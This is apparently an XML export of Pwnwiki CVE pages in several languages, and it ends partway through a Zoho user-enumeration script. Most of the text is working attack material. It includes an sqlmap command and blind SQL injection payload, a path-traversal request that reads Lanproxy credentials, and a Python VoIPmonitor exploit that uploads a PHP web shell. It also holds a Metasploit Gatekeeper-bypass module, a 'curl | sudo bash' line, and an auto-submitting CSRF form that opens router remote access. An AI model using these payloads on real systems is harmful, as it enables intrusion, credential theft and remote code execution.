IPeakCMS3.5 tiene una vulnerabilidad de inyección ciega de SQL remoto.

==POC==
&lt;pre&gt;
Use SQLmap if you've found the valid id...
e.g: sqlmap -u "site.com/cms/print.php?id=1" --dbs
Payload : id=(SELECT (CASE WHEN(3104=3104) THEN 1 ELSE (SELECT 8458) END))
&lt;/pre&gt;</text>
      <sha1>a8d3gln3hiy8uce7or5crrha2rg6krb</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-3018 IPeakCMS 3.5 SQL注入漏洞/zh-hans</title>
    <ns>0</ns>
    <id>3281</id>
    <revision>
      <id>3833</id>
      <timestamp>2021-06-01T02:59:49Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==简介== IPeakCMS3.5存在远程SQL盲注漏洞。"</comment>
      <origin>3833</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="257" sha1="sl2n31xyc5rl278ej582wzlarupiqyk" xml:space="preserve">&lt;languages /&gt;
==简介==
IPeakCMS3.5存在远程SQL盲注漏洞。

==POC==
&lt;pre&gt;
Use SQLmap if you've found the valid id...
e.g: sqlmap -u "site.com/cms/print.php?id=1" --dbs
Payload : id=(SELECT (CASE WHEN(3104=3104) THEN 1 ELSE (SELECT 8458) END))
&lt;/pre&gt;</text>
      <sha1>sl2n31xyc5rl278ej582wzlarupiqyk</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-3019 Lanproxy 目錄遍歷漏洞</title>
    <ns>0</ns>
    <id>432</id>
    <revision>
      <id>626</id>
      <timestamp>2021-03-23T02:26:28Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages  /&gt; &lt;translate&gt; ==漏洞影響== &lt;/translate&gt; &lt;pre&gt; Lanproxy 0.1 &lt;/pre&gt;  ==FOFA== &lt;pre&gt; header= "Server: LPS-0.1" &lt;/pre&gt;  &lt;translate&gt; 發送如下請求： &lt;/transl..."</comment>
      <origin>626</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="818" sha1="rod6fjafe4ykdikpr26ahkgrvkkfamz" xml:space="preserve">&lt;languages  /&gt;
&lt;translate&gt;
==漏洞影響==
&lt;/translate&gt;
&lt;pre&gt;
Lanproxy 0.1
&lt;/pre&gt;

==FOFA==
&lt;pre&gt;
header= "Server: LPS-0.1"
&lt;/pre&gt;

&lt;translate&gt;
發送如下請求：
&lt;/translate&gt;
&lt;pre&gt;
GET /../conf/config.properties HTTP/1.1
Host: xxx.xxx.xxx.xxx
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Connection: close
&lt;/pre&gt;

&lt;translate&gt;
成功在配置文件中讀取 賬號密碼。
&lt;/translate&gt;


==POC==
https://github.com/FanqXu/CVE-2021-3019/</text>
      <sha1>rod6fjafe4ykdikpr26ahkgrvkkfamz</sha1>
    </revision>
    <revision>
      <id>627</id>
      <parentid>626</parentid>
      <timestamp>2021-03-23T02:27:08Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>627</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="851" sha1="hbq5168k4a5v0uuoi2qa0sy16t5vgwf" xml:space="preserve">&lt;languages  /&gt;
&lt;translate&gt;
==漏洞影響== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;pre&gt;
Lanproxy 0.1
&lt;/pre&gt;

==FOFA==
&lt;pre&gt;
header= "Server: LPS-0.1"
&lt;/pre&gt;

&lt;translate&gt;
&lt;!--T:2--&gt;
發送如下請求：
&lt;/translate&gt;
&lt;pre&gt;
GET /../conf/config.properties HTTP/1.1
Host: xxx.xxx.xxx.xxx
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Connection: close
&lt;/pre&gt;

&lt;translate&gt;
&lt;!--T:3--&gt;
成功在配置文件中讀取 賬號密碼。
&lt;/translate&gt;


==POC==
https://github.com/FanqXu/CVE-2021-3019/</text>
      <sha1>hbq5168k4a5v0uuoi2qa0sy16t5vgwf</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-3019 Lanproxy 目錄遍歷漏洞/es</title>
    <ns>0</ns>
    <id>3527</id>
    <revision>
      <id>4101</id>
      <timestamp>2021-06-06T08:23:05Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "Leer correctamente la contraseña de la cuenta en el archivo de configuración."</comment>
      <origin>4101</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="803" sha1="6ct8qgk6q4i1dbb2i4y03v0o1kb4jjz" xml:space="preserve">&lt;languages  /&gt;
== Impacto de la vulnerabilidad ==
&lt;pre&gt;
Lanproxy 0.1
&lt;/pre&gt;

==FOFA==
&lt;pre&gt;
header= "Server: LPS-0.1"
&lt;/pre&gt;

Envíe la siguiente solicitud:
&lt;pre&gt;
GET /../conf/config.properties HTTP/1.1
Host: xxx.xxx.xxx.xxx
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Connection: close
&lt;/pre&gt;

Leer correctamente la contraseña de la cuenta en el archivo de configuración.


==POC==
https://github.com/FanqXu/CVE-2021-3019/</text>
      <sha1>6ct8qgk6q4i1dbb2i4y03v0o1kb4jjz</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-3019 Lanproxy 目錄遍歷漏洞/id</title>
    <ns>0</ns>
    <id>2825</id>
    <revision>
      <id>3326</id>
      <timestamp>2021-05-26T13:16:55Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "Berhasil membaca kata sandi akun di file konfigurasi."</comment>
      <origin>3326</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="761" sha1="m2c26edeael5s3jynjwo04wbv3f6hmw" xml:space="preserve">&lt;languages  /&gt;
== Dampak Kerentanan ==
&lt;pre&gt;
Lanproxy 0.1
&lt;/pre&gt;

==FOFA==
&lt;pre&gt;
header= "Server: LPS-0.1"
&lt;/pre&gt;

Kirim permintaan berikut:
&lt;pre&gt;
GET /../conf/config.properties HTTP/1.1
Host: xxx.xxx.xxx.xxx
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Connection: close
&lt;/pre&gt;

Berhasil membaca kata sandi akun di file konfigurasi.


==POC==
https://github.com/FanqXu/CVE-2021-3019/</text>
      <sha1>m2c26edeael5s3jynjwo04wbv3f6hmw</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-3019 Lanproxy 目錄遍歷漏洞/pt</title>
    <ns>0</ns>
    <id>4073</id>
    <revision>
      <id>4690</id>
      <timestamp>2021-06-10T03:16:04Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "Leia com sucesso a senha da conta no arquivo de configuração."</comment>
      <origin>4690</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="786" sha1="qsp4n6dxamjkshpnsw43mtoiyp968w6" xml:space="preserve">&lt;languages  /&gt;
== Impacto de vulnerabilidade ==
&lt;pre&gt;
Lanproxy 0.1
&lt;/pre&gt;

==FOFA==
&lt;pre&gt;
header= "Server: LPS-0.1"
&lt;/pre&gt;

Envie a seguinte solicitação:
&lt;pre&gt;
GET /../conf/config.properties HTTP/1.1
Host: xxx.xxx.xxx.xxx
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Connection: close
&lt;/pre&gt;

Leia com sucesso a senha da conta no arquivo de configuração.


==POC==
https://github.com/FanqXu/CVE-2021-3019/</text>
      <sha1>qsp4n6dxamjkshpnsw43mtoiyp968w6</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-3019 Lanproxy 目錄遍歷漏洞/ru</title>
    <ns>0</ns>
    <id>1438</id>
    <revision>
      <id>1812</id>
      <timestamp>2021-04-20T08:04:16Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "Отправьте следующий запрос:"</comment>
      <origin>1812</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="865" sha1="6godekokqephsdetoj4fxw3eo21kvag" xml:space="preserve">&lt;languages  /&gt;
==Воздействие уязвимости==
&lt;pre&gt;
Lanproxy 0.1
&lt;/pre&gt;

==FOFA==
&lt;pre&gt;
header= "Server: LPS-0.1"
&lt;/pre&gt;

Отправьте следующий запрос:
&lt;pre&gt;
GET /../conf/config.properties HTTP/1.1
Host: xxx.xxx.xxx.xxx
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Connection: close
&lt;/pre&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
成功在配置文件中讀取 賬號密碼。
&lt;/div&gt;


==POC==
https://github.com/FanqXu/CVE-2021-3019/</text>
      <sha1>6godekokqephsdetoj4fxw3eo21kvag</sha1>
    </revision>
    <revision>
      <id>1816</id>
      <parentid>1812</parentid>
      <timestamp>2021-04-20T08:06:33Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "Успешно считайте пароль учетной записи в файле конфигурации."</comment>
      <origin>1816</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="870" sha1="24aklrhbj5ldhu8ilavk3o8vsaolu1w" xml:space="preserve">&lt;languages  /&gt;
==Воздействие уязвимости==
&lt;pre&gt;
Lanproxy 0.1
&lt;/pre&gt;

==FOFA==
&lt;pre&gt;
header= "Server: LPS-0.1"
&lt;/pre&gt;

Отправьте следующий запрос:
&lt;pre&gt;
GET /../conf/config.properties HTTP/1.1
Host: xxx.xxx.xxx.xxx
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Connection: close
&lt;/pre&gt;

Успешно считайте пароль учетной записи в файле конфигурации.


==POC==
https://github.com/FanqXu/CVE-2021-3019/</text>
      <sha1>24aklrhbj5ldhu8ilavk3o8vsaolu1w</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-30461 VoIPmonitor 遠程PHP代碼執行漏洞</title>
    <ns>0</ns>
    <id>2253</id>
    <revision>
      <id>2683</id>
      <timestamp>2021-05-06T11:48:34Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==影響版本== VoIPmonitor 24.60及更低版本   ==EXP== &lt;pre&gt; import argparse from sys import argv,exit import time import random import string  try:     import requests e..."</comment>
      <origin>2683</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2812" sha1="fhzq1r64t4j0e7xpcr0jbtlnnkgbg16" xml:space="preserve">==影響版本==
VoIPmonitor 24.60及更低版本


==EXP==
&lt;pre&gt;
import argparse
from sys import argv,exit
import time
import random
import string

try:
    import requests
except ImportError:
    print("pip3 install requests ")

print("""
###############################################
#              VOIP Monitor RCE               #
###############################################
""")

headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Connection": "close"}


def get_target(args):
    hostname = args.host
    path = args.path
    if path:
        return f"http://{hostname}/{path}/index.php"
    else:
        return f"http://{hostname}/index.php"

def set_tmp(args):
    global headers
    target = get_target(args)
    n_data = {"SPOOLDIR": "/tmp", "recheck": "annen"}
    set_totmp = requests.post(target, n_data, headers=headers)
    print(f"[*] set /tmp {set_totmp}")


def checkVulnerability(args):
    global headers
    target = get_target(args)
    print(f"[+] Attacking {target}")
    testcmd = {"SPOOLDIR": "test\".system(id).\"", "recheck": "annen"}
    response_text = b"uid="
    testcmd_req = requests.post(target, testcmd, verify=False, headers=headers)
    if response_text in testcmd_req.content:
        print("[*] host is vulnerable")
    else:
        print("[-] host is not vulnerable")
        exit()


def uploadshell(args):
    global headers
    hostname = args.host
    path = args.path
    shell_path = ""
    shellfilename = str ( ''.join(random.choice(string.ascii_lowercase) for i in range(10)) )
    target = get_target(args)
    rce_payload = {"SPOOLDIR": f"/tmp\".file_put_contents('{shellfilename}.php','&lt;?php echo system($_GET[\"a\"]);').\"", "recheck": "annen"}
    rce_req = requests.post(target, headers=headers, data=rce_payload)
    print(f"[*] uploading shell {rce_req.status_code}")
    if path:
        shell_path = f"http://{hostname}/{path}/{shellfilename}.php"
    else:
        shell_path = f"http://{hostname}/{shellfilename}.php"
    shell_check = requests.get(shell_path, headers=headers, params={'a':'id'})
    print(f"[*] RCE Check : {shell_check.text}")
    print(f"[*] Your Shell at {shell_path}")


def main():
    parser = argparse.ArgumentParser(description='VoIP Monitor all versions command execution')
    parser.add_argument('-t','--host',help='Host', type=str)
    parser.add_argument('-b', '--path',help='Path of the VoIP Monitor', type=str)
    args = parser.parse_args()
    set_tmp(args)
    checkVulnerability(args)
    set_tmp(args)
    uploadshell(args)
    set_tmp(args)



if __name__ == "__main__":
    main()
&lt;/pre&gt;</text>
      <sha1>fhzq1r64t4j0e7xpcr0jbtlnnkgbg16</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-30657 macOS Gatekeeper檢查繞過漏洞</title>
    <ns>0</ns>
    <id>2299</id>
    <revision>
      <id>2735</id>
      <timestamp>2021-05-08T02:39:24Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== &lt;pre&gt; This Metasploit module serves an OSX app (as a zip) that contains no Info.plist, which bypasses gatekeeper in macOS versions prior to 11.3. If the user visits t..."</comment>
      <origin>2735</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4270" sha1="gn7carnl4tljgk6ptm761vkgmkokath" xml:space="preserve">==INFO==
&lt;pre&gt;
This Metasploit module serves an OSX app (as a zip) that contains no Info.plist, which bypasses gatekeeper in macOS versions prior to 11.3. If the user visits the site on Safari, the zip file is automatically extracted, and clicking on the downloaded file will automatically launch the payload. If the user visits the site in another browser, the user must click once to unzip the app, and click again in order to execute the payload.
&lt;/pre&gt;

==EXP==
&lt;pre&gt;
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule &lt; Msf::Exploit::Remote
  Rank = ManualRanking

  include Msf::Exploit::EXE
  include Msf::Exploit::Remote::HttpServer

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' =&gt; 'macOS Gatekeeper check bypass',
        'Description' =&gt; %q{
          This module serves an OSX app (as a zip) that contains no Info.plist, which
          bypasses gatekeeper in macOS &lt; 11.3.
          If the user visits the site on Safari, the zip file is automatically extracted,
          and clicking on the downloaded file will automatically launch the payload.
          If the user visits the site in another browser, the user must click once to unzip
          the app, and click again in order to execute the payload.
        },
        'License' =&gt; MSF_LICENSE,
        'Targets' =&gt; [
          [ 'macOS x64 (Native Payload)', { 'Arch' =&gt; ARCH_X64, 'Platform' =&gt; [ 'osx' ] } ],
          [ 'Python payload', { 'Arch' =&gt; ARCH_PYTHON, 'Platform' =&gt; [ 'python' ] } ],
          [ 'Command payload', { 'Arch' =&gt; ARCH_CMD, 'Platform' =&gt; [ 'unix' ] } ],
        ],
        'DefaultTarget' =&gt; 0,
        'DisclosureDate' =&gt; '2021-03-25',
        'Author' =&gt; [
          'Cedric Owens', # Discovery
          'timwr' # Module
        ],
        'Notes' =&gt;
        {
          'Stability' =&gt; [ CRASH_SAFE ],
          'Reliability' =&gt; [ REPEATABLE_SESSION ],
          'SideEffects' =&gt; [ IOC_IN_LOGS, ARTIFACTS_ON_DISK ]
        },
        'References' =&gt; [
          ['CVE', '2021-30657'],
          ['URL', 'https://cedowens.medium.com/macos-gatekeeper-bypass-2021-edition-5256a2955508'],
          ['URL', 'https://objective-see.com/blog/blog_0x64.html'],
        ]
      )
    )
    register_options([
      OptString.new('APP_NAME', [false, 'The application name (Default: app)', 'app'])
    ])
  end

  def check_useragent(user_agent)
    return false unless user_agent =~ /Intel Mac OS X (.*?)\)/

    osx_version = Regexp.last_match(1).gsub('_', '.')
    mac_osx_version = Rex::Version.new(osx_version)
    if mac_osx_version &gt;= Rex::Version.new('11.3')
      print_warning "macOS version #{mac_osx_version} is not vulnerable"
    elsif mac_osx_version &lt; Rex::Version.new('10.15.6')
      print_warning "macOS version #{mac_osx_version} is not vulnerable"
    else
      print_good "macOS version #{mac_osx_version} is vulnerable"
      return true
    end
    return false
  end

  def on_request_uri(cli, request)
    user_agent = request['User-Agent']
    print_status("Request #{request.uri} from #{user_agent}")
    unless check_useragent(user_agent)
      print_error 'Unexpected User-Agent'
      send_not_found(cli)
      return
    end

    app_name = datastore['APP_NAME'] || Rex::Text.rand_text_alpha(5)
    send_response(cli, app_zip(app_name), { 'Content-Type' =&gt; 'application/zip', 'Content-Disposition' =&gt; "attachment; filename=\"#{app_name}.zip\"" })
  end

  def app_zip(app_name)
    case target['Arch']
    when ARCH_X64
      payload_data = Msf::Util::EXE.to_python_reflection(framework, ARCH_X64, payload.encoded, {})
      command = "echo \"#{payload_data}\" | python &amp; disown"
    when ARCH_PYTHON
      command = "echo \"#{payload.encoded}\" | python"
    when ARCH_CMD
      command = payload.encoded
    end

    shell_script = &lt;&lt;~SCRIPT
      #!/bin/sh

      #{command}
    SCRIPT

    zip = Rex::Zip::Archive.new
    zip.add_file("#{app_name}.app/", '')
    zip.add_file("#{app_name}.app/Contents/", '')
    zip.add_file("#{app_name}.app/Contents/MacOS/", '')
    zip.add_file("#{app_name}.app/Contents/MacOS/#{app_name}", shell_script).last.attrs = 0o777
    zip.pack
  end
end

&lt;/pre&gt;</text>
      <sha1>gn7carnl4tljgk6ptm761vkgmkokath</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-30747 M1芯片設計缺陷漏洞</title>
    <ns>0</ns>
    <id>4264</id>
    <revision>
      <id>4902</id>
      <timestamp>2021-06-12T12:51:49Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==漏洞簡介==  在 Apple M1 中發現了一個被歸類為嚴重的漏洞（受影響的版本未知）。 &lt;/translate&gt;  ==POC== &lt;pre&gt; curl https:..."</comment>
      <origin>4902</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="230" sha1="qmmon1czcg5ul4vy5nqzf45tnqacdk9" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞簡介==

在 Apple M1 中發現了一個被歸類為嚴重的漏洞（受影響的版本未知）。
&lt;/translate&gt;

==POC==
&lt;pre&gt;
curl https://holeybeep.ninja/am_i_vulnerable.sh | sudo bash
&lt;/pre&gt;</text>
      <sha1>qmmon1czcg5ul4vy5nqzf45tnqacdk9</sha1>
    </revision>
    <revision>
      <id>4903</id>
      <parentid>4902</parentid>
      <timestamp>2021-06-12T12:52:19Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>4903</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="252" sha1="iz5hxifpis2gezfkag0zh4xk0nblnsv" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞簡介== &lt;!--T:1--&gt;

&lt;!--T:2--&gt;
在 Apple M1 中發現了一個被歸類為嚴重的漏洞（受影響的版本未知）。
&lt;/translate&gt;

==POC==
&lt;pre&gt;
curl https://holeybeep.ninja/am_i_vulnerable.sh | sudo bash
&lt;/pre&gt;</text>
      <sha1>iz5hxifpis2gezfkag0zh4xk0nblnsv</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-30747 M1芯片設計缺陷漏洞/zh-cn</title>
    <ns>0</ns>
    <id>4270</id>
    <revision>
      <id>4909</id>
      <timestamp>2021-06-12T12:53:28Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-30747 M1芯片设计缺陷漏洞"</comment>
      <origin>4909</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="266" sha1="49ufhlv998kqm096llmju9grft0cq7u" xml:space="preserve">&lt;languages /&gt;
==漏洞简介==

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
在 Apple M1 中發現了一個被歸類為嚴重的漏洞（受影響的版本未知）。
&lt;/div&gt;

==POC==
&lt;pre&gt;
curl https://holeybeep.ninja/am_i_vulnerable.sh | sudo bash
&lt;/pre&gt;</text>
      <sha1>49ufhlv998kqm096llmju9grft0cq7u</sha1>
    </revision>
    <revision>
      <id>4911</id>
      <parentid>4909</parentid>
      <timestamp>2021-06-12T12:53:51Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "在 Apple M1 中发现了一个被归类为严重的漏洞（受影响的版本未知）。"</comment>
      <origin>4911</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="205" sha1="9nuku5a1xtrjapclul1cv836xoehqtd" xml:space="preserve">&lt;languages /&gt;
==漏洞简介==

在 Apple M1 中发现了一个被归类为严重的漏洞（受影响的版本未知）。

==POC==
&lt;pre&gt;
curl https://holeybeep.ninja/am_i_vulnerable.sh | sudo bash
&lt;/pre&gt;</text>
      <sha1>9nuku5a1xtrjapclul1cv836xoehqtd</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-30747 M1芯片設計缺陷漏洞/zh-tw</title>
    <ns>0</ns>
    <id>5090</id>
    <revision>
      <id>5830</id>
      <timestamp>2021-06-24T02:28:38Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==漏洞簡介=="</comment>
      <origin>5830</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="205" sha1="lac0a80e7usljqpdwzj4t0vrs2lldy2" xml:space="preserve">&lt;languages /&gt;
==漏洞簡介==

在 Apple M1 中發現了一個被歸類為嚴重的漏洞（受影響的版本未知）。

==POC==
&lt;pre&gt;
curl https://holeybeep.ninja/am_i_vulnerable.sh | sudo bash
&lt;/pre&gt;</text>
      <sha1>lac0a80e7usljqpdwzj4t0vrs2lldy2</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-31152 Multilaser Router RE018 AC1200 跨站請求偽造漏洞（啟用遠程訪問）</title>
    <ns>0</ns>
    <id>1467</id>
    <revision>
      <id>1844</id>
      <timestamp>2021-04-21T10:02:20Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: Multilaser Router RE018 AC1200 - Cross-Site Request Forgery (Enable Remote Access) # Date: 14/04/2021 # Exploit Author: Rodolfo Mariano # Versio..."</comment>
      <origin>1844</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="734" sha1="ofzyv9f8y8hzrco9nu0sozqdhd21kx7" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: Multilaser Router RE018 AC1200 - Cross-Site Request Forgery (Enable Remote Access)
# Date: 14/04/2021
# Exploit Author: Rodolfo Mariano
# Version: Firmware V02.03.01.45_pt
# CVE: CVE-2021-31152

#Exploit code:
&lt;html&gt;
	&lt;body&gt;
		&lt;form action="http://192.168.0.1/goform/setSysTools" method="POST"&gt;
		    &lt;input name="module4" value="remoteWeb" type="hidden"&gt;
		    &lt;input name="remoteWebType" value="any" type="hidden"&gt;
		    &lt;input name="remoteWebIP" value="" type="hidden"&gt;
		    &lt;input name="remoteWebPort" value="8888" type="hidden"&gt;
            	    &lt;input type="submit" value="Submit request"&gt;
		&lt;/form&gt;
	&lt;/body&gt;
	&lt;script&gt;
		document.forms[0].submit();
	&lt;/script&gt;
	&lt;/body&gt;
&lt;/html&gt;
            
&lt;/pre&gt;</text>
      <sha1>ofzyv9f8y8hzrco9nu0sozqdhd21kx7</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-31159 Zoho ManageEngine ServiceDesk Plus MSP 9.4 用戶枚舉漏洞</title>
    <ns>0</ns>
    <id>4593</id>
    <revision>
      <id>5283</id>
      <timestamp>2021-06-18T02:54:44Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==漏洞影響== &lt;/translate&gt; Zoho ManageEngine ServiceDesk Plus 9.4  ==EXP== &lt;pre&gt; # Exploit Title: Zoho ManageEngine ServiceDesk Plus MSP 9.4 - Use..."</comment>
      <origin>5283</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2349" sha1="nwemk2ho72umoob3zb7cqigvpqh1dm4" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞影響==
&lt;/translate&gt;
Zoho ManageEngine ServiceDesk Plus 9.4

==EXP==
&lt;pre&gt;
# Exploit Title: Zoho ManageEngine ServiceDesk Plus MSP 9.4 - User Enumeration 
# Date: 17/06/2021
# Exploit Author: Ricardo Ruiz (@ricardojoserf)
# CVE: CVE-2021-31159 (https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-31159)
# Vendor Homepage: https://www.manageengine.com
# Vendor Confirmation: https://www.manageengine.com/products/service-desk-msp/readme.html#10519
# Version: Previous to build 10519
# Tested on: Zoho ManageEngine ServiceDesk Plus 9.4
# Example: python3 exploit.py -t http://example.com/ -d DOMAIN -u USERSFILE [-o OUTPUTFILE]
# Repository (for updates and fixing bugs): https://github.com/ricardojoserf/CVE-2021-31159

import argparse
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_args():
	parser = argparse.ArgumentParser()
	parser.add_argument('-d', '--domain', required=True, action='store', help='Domain to attack')
	parser.add_argument('-t', '--target', required=True, action='store', help='Target Url to attack')
	parser.add_argument('-u', '--usersfile', required=True, action='store', help='Users file')	
	parser.add_argument('-o', '--outputfile', required=False, default="listed_users.txt", action='store', help='Output file')
	my_args = parser.parse_args()
	return my_args


def main():
	args = get_args()
	url = args.target
	domain = args.domain
	usersfile = args.usersfile
	outputfile = args.outputfile

	s = requests.session()
	s.get(url)
	resp_incorrect = s.get(url+"/ForgotPassword.sd?userName="+"nonexistentuserforsure"+"&amp;dname="+domain, verify = False)
	incorrect_size = len(resp_incorrect.content)
	print("Incorrect size: %s"%(incorrect_size))

	correct_users = []
	users = open(usersfile).read().splitlines()
	for u in users:
